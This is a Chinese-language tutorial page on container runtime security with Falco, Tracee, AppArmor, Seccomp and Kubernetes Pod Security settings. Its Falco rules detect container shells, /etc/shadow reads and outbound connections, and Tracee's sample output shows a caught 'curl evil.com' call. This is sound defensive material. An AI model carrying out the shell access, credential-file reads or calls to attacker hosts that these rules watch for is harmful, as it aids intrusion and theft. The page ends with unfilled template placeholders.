---
title: 容器运行时安全
date: 2026-08-15  # date-auto-injected
---

# 容器运行时安全

## 一句话总结

> **运行时安全 = 检测容器内异常行为**。**主流：Falco（syscall 检测）/ Tracee（eBPF）/ Aqua / Sysdig**。**核心：默认 deny + 不可变 + 最小权限 + 异常告警**。

---

## 主流运行时工具

| 工具 | 原理 | 资源占用 | 场景 |
|------|------|---------|------|
| **Falco** | Syscall / 内核模块 | 中 | 通用 |
| **Tracee** | eBPF | 低 | 现代 |
| **Aqua** | 商业 | 中 | 企业 |
| **Sysdig Secure** | 商业 | 中 | 企业 |
| **AppArmor** | LSM | 极低 | 强制访问控制 |
| **Seccomp** | BPF | 极低 | 系统调用过滤 |

## 实战：Falco 安装

```bash
# Helm 安装
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco     --namespace falco --create-namespace     --set tty=true     --set falco.json_output=true
```

```bash
# Docker 方式
docker run -d     --name falco     --privileged     -v /var/run/docker.sock:/var/run/docker.sock     -v /dev:/host/dev     -v /proc:/host/proc:ro     falcosecurity/falco
```

## 实战：Falco 默认规则

```yaml
# 检测容器内执行 shell
- rule: Terminal shell in container
  desc: Alert if a shell is spawned in a container
  condition: >
    container.id != host and
    proc.name = bash
  output: >
    Shell spawned in container
    (user=%user.name command=%proc.cmdline container=%container.name)
  priority: WARNING

# 检测敏感文件读取
- rule: Read sensitive file untrusted
  condition: >
    open_read and
    fd.name startswith /etc/shadow
  output: Sensitive file read
  priority: CRITICAL

# 检测出站连接
- rule: Unexpected outbound connection
  condition: >
    container.id != host and
    outbound and
    not allowed_outbound
  output: Outbound connection
  priority: WARNING
```

## 实战：Falco 自定义规则

```yaml
# 检测 kubectl exec 进入容器
- rule: Kube exec into container
  condition: >
    k8s_audit and
    ka.target.resource = pods and
    ka.verb = create and
    ka.subresource = exec
  output: >
    kubectl exec into container
    (user=%ka.user.name pod=%ka.target.name ns=%ka.target.namespace)
  priority: WARNING
```

## 实战：Tracee（eBPF）

```bash
# 运行
docker run --name tracee -it --rm     --pid=host --cgroupns=host     --privileged -v /etc/os-release:/etc/os-release-host:ro     aquasec/tracee:$(uname -m)     --containers

# 输出
# Loaded 52 signatures
# 14:32:01: SYSCALL: execve
#   process: curl
#   args: ["curl", "evil.com"]
```

## 实战：AppArmor 配置文件

```yaml
# /etc/apparmor.d/myapp
#include <tunables/global>

profile myapp flags=(attach_disconnected,mediate_deleted) {
    #include <abstractions/base>

    # 允许读取
    /home/myapp/** r,
    /etc/passwd r,
    /etc/hostname r,

    # 禁止网络（应用层需要时再开）
    deny network,

    # 禁止 capability
    deny capability,
}
```

```bash
# 加载
apparmor_parser -r /etc/apparmor.d/myapp

# K8s 注解
apiVersion: v1
kind: Pod
metadata:
  name: app
  annotations:
    container.apparmor.security.beta.kubernetes.io/myapp: localhost/myapp
```

## 实战：Seccomp 配置文件

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": ["read", "write", "exit", "exit_group", "brk"],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

```yaml
# K8s Pod 使用
apiVersion: v1
kind: Pod
metadata:
  name: app
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/audit.json
```

## 实战：不可变基础设施

```yaml
# 禁止修改容器文件系统
apiVersion: v1
kind: Pod
metadata:
  name: app
spec:
  containers:
    - name: app
      image: myapp:1.0.0
      securityContext:
        readOnlyRootFilesystem: true
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir: {}
```

## 实战：异常告警（Falco → Slack）

```yaml
# falco.yaml
program_output:
  enabled: true
  keep_alive: false
  program: "jq '{text: .output}' | curl -d @- -X POST https://hooks.slack.com/services/YOUR/WEBHOOK"
```

## 实战：K8s Pod Security Standards

```yaml
# 受限（restricted）：最严格
apiVersion: v1
kind: Pod
metadata:
  name: app
  namespace: prod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
        runAsNonRoot: true
        runAsUser: 1000
```

## 关联章节

- **05-container/overview**：容器安全总览
- **05-container/image-scan**：镜像扫描
- **05-container/supply-chain**：SBOM / 签名
- **06-zero-trust/implementation**：零信任落地

## 一句话总结

> **运行时安全 = Falco（syscall）+ Tracee（eBPF）+ AppArmor / Seccomp（强制）**。**核心：默认 deny + 不可变 + 最小权限 + 异常告警**。


<!-- auto-enrich:do-not-edit -->

## 相关阅读

> TODO: 在此补充 3-5 个内部链接（指向同站其他页面）或外部参考。

示例：
- 同站首页
- 进阶话题
- 实战案例
- 参考资料

## 进阶话题

> TODO: 此节可补充 3-5 段深度内容（如生产环境实战 / 常见错误 / 对比其他方案 / 未来演进）。

补充方向：
- 在生产环境如何配置 / 调优
- 与同类方案的对比（如 A vs B）
- 常见 3-5 个错误及排查
- 进阶阅读资料链接
<!-- auto-enrich:do-not-edit -->
